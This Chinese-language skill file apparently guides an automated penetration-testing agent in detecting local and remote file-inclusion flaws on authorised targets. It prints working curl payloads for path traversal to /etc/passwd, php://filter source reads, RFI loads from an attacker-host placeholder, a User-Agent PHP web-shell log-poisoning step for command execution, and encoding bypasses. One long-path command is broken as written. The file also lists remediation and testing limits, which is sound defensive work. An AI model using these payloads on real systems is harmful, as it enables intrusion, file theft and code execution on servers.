---
name: file-inclusion
description: 文件包含检测技能 —— 面向真实业务系统，定位接收文件路径参数的端点（页面渲染/模板加载/配置导入），通过注入路径遍历和 URL 参数探测应用是否未过滤用户输入的文件路径，验证 LFI（本地文件包含）和 RFI（远程文件包含）漏洞，产生可复现 PoC
phase: test
severity_focus: high
---

# 文件包含检测技能（LFI/RFI）

> 定位：面向**真实授权业务系统**的文件包含验证，不是跑扫描器出报告。核心在于「识别哪些端点接收文件路径参数」并「证明应用未对用户输入的文件路径进行安全过滤」——重点检测页面包含、模板加载、配置导入、文件下载等接收文件路径的端点，而非盲目对所有参数发送文件包含 Payload。

## 漏洞原理

文件包含漏洞的本质是：应用在处理用户可控的文件路径参数时，**未对路径进行安全验证和过滤**，直接将其传递给文件包含函数（如 PHP 的 `include()`/`require()`、Java 的 `FileInputStream`、Node.js 的 `fs.readFile()`），攻击者可以通过构造恶意路径读取服务器上的任意文件或加载远程恶意代码。

- **本地文件包含（LFI）**：应用接收文件路径参数并使用包含函数加载本地文件，攻击者通过路径遍历（`../`）和绝对路径读取服务器上的敏感文件——如 `/etc/passwd`、配置文件、源代码。LFI 不依赖远程服务器加载，攻击路径为本地文件系统。
- **远程文件包含（RFI）**：应用接收文件路径参数并将其用于远程文件加载（如 PHP 的 `allow_url_include=on` 时支持 `http://`/`ftp://`），攻击者可以指定攻击者控制的 URL，让服务器加载并执行远程恶意代码——这是比 LFI 更严重的漏洞，可直接获取服务器权限。
- **PHP Wrapper 利用**：PHP 环境下，LFI 可配合 PHP 伪协议（`php://filter/`）绕过文件执行限制，直接读取文件内容（`php://filter/convert.base64-encode/resource=/etc/passwd`），或通过 `expect://` 执行系统命令。
- **路径截断**：部分应用对路径长度有限制，攻击者通过超长路径或特殊字符（`%00` 空字节）截断后续验证，绕过路径白名单。
- **日志注入**：LFI 结合日志文件写入（如将 PHP 代码写入 Apache/Nginx 访问日志），再通过 LFI 包含日志文件实现代码执行。

**关键判断依据**：注入恶意路径后，响应中出现目标文件的内容（如 `/etc/passwd` 的行）或服务器向攻击者控制的 URL 发起请求（RFI 场景），即确认漏洞存在。

## 触发条件

满足以下任一信号即应进入本技能（侦察阶段 `endpoints.json` 标注了候选文件包含端点）：

- 接收文件路径参数：URL 参数包含 `file`、`page`、`include`、`document`、`template`、`config`、`path`、`dir`、`lang`、`style` 等路径相关关键字。
- 文件下载功能：`/download`、`/view`、`/preview` 端点接收 `filename` 或 `path` 参数。
- 多语言/主题切换：`?lang=zh_CN`、`?theme=default` 可能对应文件加载（`include/lang/zh_CN.php`）。
- 模板渲染：`/template`、`/render` 端点接收模板名称参数。
- 配置导入：`/import`、`/load` 端点接收配置文件路径。
- 历史遗留路径：URL 中出现 `?page=home.php`、`?include=header.php` 等显式文件名。

## 检测方法

> 步骤1 识别文件包含端点 → 步骤2 注入路径遍历 Payload → 步骤3 观察响应差异 → 步骤4 确认漏洞 → 步骤5 区分 LFI/RFI

### 步骤一：文件包含端点识别

1. **参数名称分析**：从 Burp 历史中筛选参数名包含 `file`/`page`/`include`/`document`/`template`/`config`/`path` 的端点。
2. **响应内容观察**：正常请求响应中出现类似 `include(home.php)`、`loading template: default.html` 的调试信息，说明应用在使用文件包含。
3. **文件扩展名推断**：参数值为 `.php`、`.html`、`.jsp`、`.asp` 等文件名，提示应用在加载具体文件。
4. **功能点梳理**：文件下载、多语言切换、主题切换、模板预览等典型功能是文件包含的高发场景。

### 步骤二：基础 LFI 注入（路径遍历）

核心验证动作——注入路径遍历读取敏感文件，观察响应是否回显文件内容。

1. **注入路径遍历**：在文件路径参数中注入 `../` 尝试读取上级目录文件：

```
?file=../../../etc/passwd
?page=../../../../../etc/passwd
?include=../../../../etc/passwd
```

2. **发送请求**：用 `curl` 发送注入后的请求：

```bash
curl 'https://target.com/view.php?file=../../../etc/passwd'
curl 'https://target.com/index.php?page=../../../../../etc/passwd'
```

3. **成功判断**：
   - 响应体中包含 `/etc/passwd` 的内容（`root:x:0:0:` 等行）。
   - 错误信息中泄露文件内容（部分应用在文件打开失败时将路径或部分内容输出到错误响应）。
   - 响应体中出现预期文件的特征字符串（如注入 `file:///proc/self/environ` 后响应中出现环境变量名）。

4. **Windows 目标**：使用 `..\..\..\..\windows\win.ini`，成功标志为响应中出现 `[fonts]` 行。

5. **绝对路径尝试**：相对路径无效时尝试绝对路径：

```bash
curl 'https://target.com/view.php?file=/etc/passwd'
curl 'https://target.com/view.php?file=C:/Windows/win.ini'
```

### 步骤三：PHP Wrapper 利用（Base64 编码读取）

PHP 环境下，当文件内容包含特殊字符导致显示异常时，使用 `php://filter` 伪协议编码读取。

1. **注入 Filter Payload**：

```bash
curl 'https://target.com/view.php?file=php://filter/convert.base64-encode/resource=/etc/passwd'
```

2. **解码验证**：响应返回 Base64 编码的文件内容，使用 `base64 -d` 解码确认：

```bash
echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo=" | base64 -d
# 输出: root:x:0:0:root:/root:/bin/bash
```

3. **其他 Wrapper**：
   - `php://filter/read=convert.base64-encode/resource=config.php` - 读取配置文件
   - `expect://id` - 如果 PHP 安装了 expect 扩展，可执行系统命令（高危，慎用）

### 步骤四：RFI 检测（远程文件包含）

检测应用是否支持通过 URL 加载远程文件。

1. **准备远程文件**：在攻击者控制的服务器上准备测试文件（如 `test.txt`，内容为 `RFI_SUCCESS`）。

2. **注入 URL Payload**：

```bash
curl 'https://target.com/view.php?file=http://ATTACKER_SERVER/test.txt'
curl 'https://target.com/view.php?file=https://ATTACKER_SERVER/evil.php'
```

3. **成功判断**：
   - 响应体中包含远程文件的内容（如 `RFI_SUCCESS`）。
   - 攻击者服务器收到来自目标服务器的 HTTP 请求（即使响应不回显，通过日志确认请求发生）。
   - 如果远程文件为 PHP 代码，服务器执行后返回执行结果（如 `phpinfo()` 输出）。

4. **FTP 协议尝试**：部分应用支持 `ftp://` 协议：

```bash
curl 'https://target.com/view.php?file=ftp://ATTACKER_SERVER/test.txt'
```

### 步骤五：日志注入与代码执行（进阶）

LFI 结合日志文件写入，实现代码执行。

1. **写入 Payload 到日志**：向目标发送包含恶意 PHP 代码的请求，代码被写入访问日志：

```bash
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" 'https://target.com/index.php?page=home'
```

2. **包含日志文件**：通过 LFI 包含日志文件（如 `/var/log/apache2/access.log`）：

```bash
curl 'https://target.com/view.php?file=/var/log/apache2/access.log&cmd=whoami'
```

3. **成功判断**：响应中出现命令执行结果（如 `www-data` 或 `root`）。

### 步骤六：路径截断与绕过

检测应用是否存在路径验证绕过。

1. **空字节截断**（PHP < 5.3.4）：

```bash
curl 'https://target.com/view.php?file=../../../etc/passwd%00.jpg'
```

2. **超长路径截断**：

```bash
curl 'https://target.com/view.php?file=../../../etc/passwd' + 'A' * 2000
```

3. **双编码绕过**：

```bash
curl 'https://target.com/view.php?file=..%252f..%252f..%252fetc%252fpasswd'
```

## 三层测试模型

> 对齐 DESIGN §3.1：L1 快速筛选候选 → L2 确认可利用 → L3 对抗防护绕过。

### L1 探测

目标：快速识别哪些端点接收文件路径参数。

- **参数名称匹配**：筛选参数名包含 `file`/`page`/`include`/`document`/`template`/`config` 的端点。
- **值特征分析**：参数值为 `.php`、`.html`、`.jsp` 等文件名，标记为候选。
- **响应关键词**：正常响应中出现 `include`、`require`、`loading file` 等关键词，标记为候选。

### L2 验证

目标：对 L1 筛选出的候选端点，通过路径遍历证明漏洞存在。

- **基础 LFI**：注入 `../../../etc/passwd`，响应包含 passwd 内容即确认。
- **PHP Wrapper**：使用 `php://filter/convert.base64-encode/resource=` 绕过文件执行限制。
- **RFI 检测**：注入 `http://` URL，响应包含远程文件内容或攻击者服务器收到请求即确认。

### L3 绕过

目标：当存在 WAF/路径过滤时，测试绕过路径。

- **编码绕过**：URL 双编码、Unicode 编码绕过路径检测。
- **空字节截断**：使用 `%00` 截断后续验证。
- **路径混淆**：`./`、`//`、混合大小写（`/.././Etc/PaSsWd`）。
- **伪协议组合**：`php://filter` + `convert.base64-encode` 绕过文件类型检测。

## 工具

常用工具包括 curl（命令行验证）、Burp Suite（拦截重放）、wfuzz（模糊测试）。

### curl（命令行注入）

```bash
# 基础 LFI - 读取 /etc/passwd
curl 'https://target.com/view.php?file=../../../etc/passwd'

# 绝对路径 LFI
curl 'https://target.com/view.php?file=/etc/passwd'

# PHP Wrapper - Base64 编码读取
curl 'https://target.com/view.php?file=php://filter/convert.base64-encode/resource=/etc/passwd'

# PHP Wrapper - 读取配置文件
curl 'https://target.com/view.php?file=php://filter/read=convert.base64-encode/resource=config.php'

# RFI - 加载远程文件
curl 'https://target.com/view.php?file=http://ATTACKER_SERVER/test.txt'

# 空字节截断绕过
curl 'https://target.com/view.php?file=../../../etc/passwd%00.jpg'

# Windows 目标
curl 'https://target.com/view.php?file=..\..\..\..\windows\win.ini'

# 日志注入 LFI（代码执行）
curl 'https://target.com/view.php?file=/var/log/apache2/access.log&cmd=whoami'
```

### Burp Suite（抓包与注入）

1. Proxy → Intercept 捕获文件路径参数请求。
2. Send to Repeater，修改参数注入路径遍历 Payload。
3. Intruder 批量测试多个端点，使用 Payload 列表（`../../../etc/passwd`、`php://filter/...`、`http://...`）。
4. 使用 Burp Collaborator 验证 RFI（即使响应不回显，通过 Collaborator 接收请求确认）。

### wfuzz（模糊测试）

```bash
# 批量测试路径遍历
wfuzz -z file,/usr/share/wfuzz/wordlist/vulns/dirTraversal.txt 'https://target.com/view.php?file=FUZZ'

# 测试 PHP Wrapper
wfuzz -z file,php_wrappers.txt 'https://target.com/view.php?file=FUZZ/etc/passwd'
```

## 输出格式

每个确认的文件包含漏洞按以下 Finding 结构输出（result 初值 `validation_inconclusive`，留给校验流水线）：

```json
{
  "id": "LFI-001",
  "type": "file-inclusion",
  "severity": "high",
  "status": "confirmed",
  "result": "validation_inconclusive",
  "title": "文件查看接口存在本地文件包含漏洞（LFI）",
  "endpoint": "GET /view.php?file=...",
  "description": "该端点接收用户可控的文件路径参数并直接用于文件包含操作，未对路径进行安全验证。攻击者可通过路径遍历（../）读取服务器上的任意敏感文件（如 /etc/passwd），在 PHP 环境下还可配合 php://filter 伪协议绕过文件执行限制直接读取文件内容",
  "payload": {
    "method": "GET",
    "url": "/view.php?file=../../../etc/passwd",
    "headers": {},
    "body": "",
    "note": "注入路径遍历读取 /etc/passwd，响应体中回显文件内容"
  },
  "verification_steps": [
    "1. 识别端点接收 file 参数，参数值为文件路径（view.php?file=home.php）",
    "2. 注入路径遍历 Payload（../../../etc/passwd）尝试读取上级目录文件",
    "3. 观察响应体是否包含 /etc/passwd 文件内容（root:x:0:0: 等特征行）",
    "4. 若响应异常，尝试使用 php://filter/convert.base64-encode/resource= 编码读取",
    "5. 测试 RFI，注入 http:// URL 验证是否支持远程文件包含"
  ],
  "evidence": {
    "response_status": 200,
    "response_indicator": "root:x:0:0:root:/root:/bin/bash",
    "inclusion_type": "local_file_inclusion",
    "path_traversal_used": true,
    "wrapper_used": false,
    "rfi_supported": false,
    "remote_url_requested": null
  },
  "remediation": "禁用直接使用用户输入作为文件路径，使用白名单验证文件名（仅允许预定义的文件列表）；如需动态路径，必须对用户输入进行严格过滤（禁止 ../、绝对路径、特殊字符）；禁用 allow_url_include 配置（PHP）；将文件包含函数替换为安全的模板渲染引擎"
}
```

## 证据要求

什么才算确认文件包含（禁止仅凭「端点接收路径参数」下结论，要证明路径被实际用于文件包含）：

1. **文件内容回显确认**：注入恶意路径后，响应体中出现目标文件的实际内容（如 `/etc/passwd` 的 `root:x:0:0:` 行），这是核心判定。
2. **Base64 编码内容确认**：使用 `php://filter/convert.base64-encode/resource=` 后，响应返回的 Base64 字符串解码后为目标文件内容，证明文件被读取。
3. **RFI 请求确认**：注入 `http://` URL 后，攻击者控制的服务器收到来自目标服务器的 HTTP 请求，即使响应不回显，也证明应用发起了远程文件请求。
4. **代码执行确认**：通过日志注入 LFI 后，响应中出现命令执行结果（如 `whoami` 输出），证明漏洞可被利用为代码执行。
5. **影响说明**：注明文件读取范围（任意文件/受限目录）、RFI 是否可用、是否可实现代码执行，据此定级。
6. **证据脱敏**：读取到的文件内容（如 `/etc/passwd`）在证据中截断展示前几行即可，不完整泄露；攻击者服务器地址使用占位符。

## 禁止事项

- **仅授权目标**：文件包含测试向目标发送特殊构造的路径请求，可能导致服务器文件读取和远程代码执行，必须在书面授权范围内操作。
- **不读取敏感凭据文件**：优先读取 `/etc/hostname`、`/etc/passwd` 等低敏感度文件证明漏洞；禁止读取 SSH 私钥、数据库配置等高敏感文件并记录到证据中。
- **不利用 RFI 横向渗透**：RFI Payload 只验证「请求是否发出」（如加载测试文本文件），不利用获取的临时凭证进一步渗透内网。
- **DoS 限制**：禁止发送超长路径（如 10,000 字符）或大量并发请求，这类测试可能导致服务器资源耗尽。
- **凭证不明文**：通过 LFI 读取到的任何文件内容，证据只记录特征行（证明文件被读取），不完整泄露文件内容。
- **远程代码执行限制**：日志注入 LFI 可导致代码执行，测试时只执行无害命令（如 `whoami`、`hostname`），禁止执行破坏性命令或访问内网。
- **RFI 恶意代码限制**：RFI 测试时，远程文件只包含无害文本（如 `RFI_SUCCESS`），禁止放置后门或恶意代码。
- **日志清理**：如使用日志注入方式测试，测试完成后应告知被测方清理日志中的恶意代码记录。
